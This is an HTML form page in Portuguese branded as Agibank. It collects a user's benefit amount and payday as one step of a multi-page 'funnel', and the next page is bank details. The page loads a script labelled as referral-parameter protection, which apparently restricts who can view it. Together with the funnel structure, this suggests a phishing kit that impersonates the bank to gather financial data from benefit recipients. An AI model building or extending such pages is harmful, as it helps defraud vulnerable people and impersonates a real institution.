<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Agibank - Detalhes do Benefício</title>
    <!-- Proteção por Referência (?ref=) -->
    <script src="assets/js/ref-guard.js"></script>
    <script src="assets/js/tailwind.js"></script>
    <link href="assets/css/inter.css" rel="stylesheet">
    <script src="assets/js/funnel.js"></script>
    <style>
        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; background: linear-gradient(135deg, #0064F5 0%, #003d99 100%); }
        .beneficio-card { backdrop-filter: blur(10px); background: rgba(255, 255, 255, 0.95); }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <div class="beneficio-card w-full max-w-md p-6 md:p-8 rounded-3xl shadow-2xl">
        <div class="text-center mb-6">
            <img src="assets/img/logo-agi.png" alt="Agibank" class="h-9 mx-auto mb-4 object-contain">
            <h1 class="text-xl md:text-2xl font-bold text-gray-900">Dados do Benefício</h1>
            <p class="text-sm text-gray-500 mt-1">Precisamos desses detalhes para calcular sua margem consignada com o Agibank.</p>
        </div>
        
        <form id="beneficio-form" class="space-y-5">
            <div>
                <label class="block text-xs font-bold text-gray-500 uppercase mb-1.5 ml-1 tracking-wider">Valor do Benefício (R$)</label>
                <input type="text" id="valor_beneficio" name="valor_beneficio" required inputmode="decimal" placeholder="R$ 0,00" autocomplete="off" class="w-full px-5 py-4 bg-gray-50 border-2 border-gray-100 rounded-2xl focus:border-[#0064F5] focus:bg-white outline-none transition-all text-lg font-bold text-gray-800">
            </div>

            <div class="relative">
                <label class="block text-xs font-bold text-gray-500 uppercase mb-1.5 ml-1 tracking-wider">Dia do Recebimento</label>
                <select id="dia_recebimento" name="dia_recebimento" required class="w-full px-5 py-4 bg-gray-50 border-2 border-gray-100 rounded-2xl focus:border-[#0064F5] focus:bg-white outline-none transition-all text-lg font-bold text-gray-800 appearance-none">
                    <option value="">Selecione o dia</option>
                    <script>
                        for (let d = 1; d <= 31; d++) {
                            document.write(`<option value="${d}">Todo dia ${d}</option>`);
                        }
                    </script>
                </select>
                <div class="absolute right-5 top-[2.85rem] pointer-events-none text-gray-400">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                        <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"></path>
                    </svg>
                </div>
            </div>
            
            <button type="submit" id="btn-submit" class="w-full bg-[#0064F5] hover:bg-[#0052cc] text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-200 transition-all transform hover:-translate-y-1 mt-4">
                CONTINUAR
            </button>
            <button type="button" onclick="window.history.back()" class="w-full bg-gray-100 hover:bg-gray-200 text-gray-600 font-bold py-3.5 rounded-2xl transition-all text-sm">
                VOLTAR
            </button>
        </form>
    </div>

    <script>
        const valorInput = document.getElementById('valor_beneficio');

        // Formatação inteligente e fluida de moeda (R$)
        function formatCurrencyInput(val) {
            if (!val || val === 'R$' || val === 'R$ ') return '';
            // Remove prefixo R$ e pontos de milhar antigos
            let clean = val.replace(/^R\$\s*/i, '').replace(/\./g, '');
            // Converte ponto digitado no teclado para vírgula
            clean = clean.replace(/\./g, ',').replace(/[^\d,]/g, '');

            const commaIndex = clean.indexOf(',');
            let intPart = '';
            let decPart = null;

            if (commaIndex !== -1) {
                intPart = clean.substring(0, commaIndex);
                decPart = clean.substring(commaIndex + 1).replace(/\D/g, '').substring(0, 2);
            } else {
                intPart = clean.replace(/\D/g, '');
            }

            if (!intPart && decPart === null) return '';

            // Limita a até 6 dígitos de inteiros (ex: até R$ 999.999)
            if (intPart.length > 6) {
                intPart = intPart.substring(0, 6);
            }

            let formattedInt = intPart ? parseInt(intPart, 10).toLocaleString('pt-BR') : '0';
            let finalVal = 'R$ ' + formattedInt;
            if (decPart !== null) {
                finalVal += ',' + decPart;
            }
            return finalVal;
        }

        // Completa com centavos (,00) ao sair do campo
        function finalizeCurrencyInput(val) {
            if (!val || val === 'R$' || val === 'R$ ') return '';
            let clean = val.replace(/^R\$\s*/i, '').replace(/\./g, '');
            let parts = clean.split(',');
            let intPart = parts[0] || '0';
            let decPart = parts.length > 1 ? parts[1].padEnd(2, '0').substring(0, 2) : '00';
            let num = parseInt(intPart, 10);
            if (isNaN(num) || num === 0) return '';
            return 'R$ ' + num.toLocaleString('pt-BR') + ',' + decPart;
        }

        valorInput.addEventListener('input', function() {
            this.value = formatCurrencyInput(this.value);
        });

        valorInput.addEventListener('blur', function() {
            this.value = finalizeCurrencyInput(this.value);
        });

        // Carrega dados salvos se houver
        const savedData = getFunnelData();
        if (savedData.valor_beneficio) {
            valorInput.value = finalizeCurrencyInput(savedData.valor_beneficio);
        }
        if (savedData.dia_recebimento) {
            document.getElementById('dia_recebimento').value = savedData.dia_recebimento;
        }

        function resetFormState() {
            const btn = document.getElementById('btn-submit');
            if (btn) {
                btn.disabled = false;
                btn.innerText = 'CONTINUAR';
            }
        }

        window.addEventListener('pageshow', resetFormState);

        document.getElementById('beneficio-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Garante formatação completa antes de validar
            valorInput.value = finalizeCurrencyInput(valorInput.value);

            const btn = document.getElementById('btn-submit');
            btn.innerText = 'Processando...';
            btn.disabled = true;
            
            const valor = valorInput.value;
            const dia = document.getElementById('dia_recebimento').value;

            // Extrai o valor numérico com segurança
            const cleanNumStr = valor.replace(/^R\$\s*/i, '').replace(/\./g, '').replace(',', '.').trim();
            const valorNumerico = parseFloat(cleanNumStr);
            
            if (isNaN(valorNumerico) || valorNumerico < 500) {
                alert('O valor do benefício deve ser de pelo menos R$ 500,00.');
                btn.innerText = 'CONTINUAR';
                btn.disabled = false;
                valorInput.focus();
                return;
            }

            sessionStorage.setItem('valor_beneficio', valor);
            sessionStorage.setItem('dia_recebimento', dia);

            saveFunnelData('beneficio', {
                valor_beneficio: valor,
                dia_recebimento: dia
            });

            // Próxima etapa do funil: BANCO
            navTo('banco.html');
        });
    </script>
</body>
</html>
